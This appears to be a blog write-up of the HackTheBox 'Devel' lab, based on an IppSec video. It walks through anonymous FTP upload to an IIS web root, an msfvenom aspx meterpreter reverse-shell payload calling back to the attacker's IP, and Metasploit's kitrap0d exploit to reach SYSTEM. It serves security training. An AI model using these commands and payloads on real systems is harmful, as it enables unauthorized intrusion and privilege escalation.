---
published: true
---

Disassembly of IppSec’s youtube video HackTheBox - Devel. Windows box which is completely done within metasploit and the standard commands you would use to enumerate a box and interact. Great metasploit refresher.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556944947259_image.png)


This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.

# Enumeration

nmap scan:

    nmap -sC -sV -oA nmap 10.10.10.5

(results)

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945306477_image.png)


*FTP is open which is interesting and normal http is quite normal*

## navigate to web-server

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945370799_image.png)

*The default login page exists for IIS, further investigating the image file name we see its labeled “welcome.png” which is a file name that was enumerated in the FTP*

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945465244_image.png)

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945481865_image.png)

checking out the `/isstart.htm` which is the main index page:

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945533875_image.png)

*the HTTP server is most likely in the same directory as the FTP server.*

## ftp to open port
    ftp 10.10.10.5
    username: anonymous
    password: anything

create a test file locally

    echo ippsec > test

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945651120_image.png)

“put” file on the ftp

    put test

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945737785_image.png)

*file uploaded successfully to the ftp server.*


## viewing uploaded file
Noticing that when the file is accessed via the web-server if the file name doesn’t have an extension the server gives a 404 error.

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556945856341_image.png)

if the test extention is changed to an `test.html` a 200 response is returned.

    mv test test.html

upload

    put test.html

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556946511833_image.png)

*returns the 200 response an displays the text.html*

# Burp Suite
Keep in mind that IIS servers do execute code normally `.asp` or `.aspx`  file extentions.

## intercept request with burp
intercepted request sent over to repeater (ctrl+r)

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556946727134_image.png)

*web server is report IIS 7.5*

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556946793242_image.png)

*which is Windows 7 and Windows Server 2008 R2. Thought process is that* `*.asp*` is based off VBS and `.aspx` is based off .NET Framework, which is more likely in this case.

# msfvenom
    msfvenom -h

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556946940904_image.png)

flags that will be used: 	
-p = payload
-f = format
-o = output
 
## list msfvenom payloads
    msfvenom -l | grep windows

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947153741_image.png)

*being cognizant of the type of payload chosen as 32-bit and 64-bit do not match.*

## list msfvenom formats
    msfvenom --help-formats

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948110033_image.png)

## setup payload
    msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o ippsec.aspx

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947512687_image.png)

*This created an aspx file that will load meterpreter*

viewing file created:

    less ippsec.aspx

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947564655_image.png)

*referred to as the magic!*

## upload payload
on the FTP server

    put ippsec.aspx

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947733165_image.png)

## load msfconsole/listener
    msfdb run # first time run and starts postgress server
    msfconsole # normal way without postgress server

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947866994_image.png)

    use exploit/multi/handler
    show options

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947895731_image.png)

set payload:

    set payload windows/meterpreter/reverse_tcp # what was chosen on msfvenom
    show options

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556947966334_image.png)

set LHOST to local ip address

    set LHOST tun0 # or adapter name
    run

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948030242_image.png)

## recreating payload with host/port
when the payload was created without the LHOST and LPORT

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f aspx -o ippsec.aspx

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948209058_image.png)

re-upload to ftp server

    put ippsec.aspx

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948256812_image.png)

## navigate to payload

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948318348_image.png)

response:

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948345370_image.png)

*interpreter shell connection was created.*

## Metasploit interaction with shell
To interact with shell

    sessions -i 1

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556948551825_image.png)

first step:

    sysinfo

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949035780_image.png)

check *architecture check which is an x86*

    shell
    systeminfo # inside of shell

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949110968_image.png)

*normally would say the hotfixes installed but in this case it says N/A which could mean this machine has never been updated. Keep in mide the boot time, and Service Pack*

## metasploit exploit suggester

background current shell and search for suggest

    search suggest

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949248261_image.png)

use `local_exploit_suggester`

    use post/multi/recon/local_exploit_suggester
    show options

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949351579_image.png)

set session to current session:

    set SESSION 1

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949386833_image.png)

    run

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949463813_image.png)

*since this box hasn’t been updated since release with a release date of 2009 selecting any of the returned vulnerable exploits might work.*

Choosing the first exploit ms10-015 kitrap0d

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949606429_image.png)

    use exploit/windows/local/ms10_015_kitrap0d
    show options

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949647444_image.png)

    set SESSION 1
    show options # second time to verify that the session was added.

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949698641_image.png)

    run

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949739553_image.png)

 *since we didnt set a payload metasploit opted to use* `*windows/meterpreter/reverse_tcp*` which is not configured correctly to the LHOST and LPORT

    set LHOST 10.10.14.17
    run

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556949821653_image.png)

*an error occured and the box crashed so he re did all the step to this point and re-ran the exploit*

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556950126744_image.png)

connect to shell

    shell
    whoami

![](https://paper-attachments.dropbox.com/s_9B8ABAF92E8BD4C79A9AECC7328DE9A6C794C02AEC511B6D2489E66CA14CED53_1556950163710_image.png)

*operating at nt authority/system!*

#HAILippsec


----------

If you don’t know who IppSec is check him out at:

Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
Twitter: https://twitter.com/ippsec

